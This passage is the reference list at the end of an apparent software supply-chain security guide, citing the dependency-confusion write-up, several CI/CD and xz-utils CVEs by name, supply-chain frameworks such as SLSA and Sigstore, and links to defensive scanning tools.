- **Alex Birsan dependency confusion** (2021): [medium.com/@alex.birsan/dependency-confusion-4a5d608670d9](https://medium.com/@alex.birsan/dependency-confusion-4a5d608670d9)

### CVEs Referenced

- **CVE-2024-23897** — Jenkins CLI args4j file read
- **CVE-2022-1162** — GitLab Runner registration takeover
- **CVE-2024-9653** — GitLab OmniAuth provider abuse
- **CVE-2022-24348** — Argo CD Helm values leak
- **CVE-2024-3094** — xz-utils backdoor

### Frameworks

- **SLSA** — [slsa.dev](https://slsa.dev/)
- **Sigstore / cosign** — [sigstore.dev](https://sigstore.dev/)
- **in-toto** — [in-toto.io](https://in-toto.io/)
- **S2C2F** — [openssf.org/community/s2c2f](https://openssf.org/community/s2c2f/)
- **OpenSSF Scorecard** — [github.com/ossf/scorecard](https://github.com/ossf/scorecard)

### Tool Homes

- **StepSecurity Harden-Runner**: [github.com/step-security/harden-runner](https://github.com/step-security/harden-runner)
- **Socket Security**: [socket.dev](https://socket.dev/)
- **Sonatype Nexus**: [sonatype.com/products/nexus-repository](https://www.sonatype.com/products/nexus-repository)
- **Snyk**: [snyk.io](https://snyk.io/)
- **Anchore Syft / Grype**: [anchore.com](https://anchore.com/)
- **KICS**: [kics.io](https://kics.io/)
- **Checkov**: [checkov.io](https://www.checkov.io/)
- **semgrep**: [semgrep.dev](https://semgrep.dev/)
- **trivy**: [aquasecurity.github.io/trivy](https://aquasecurity.github.io/trivy/)
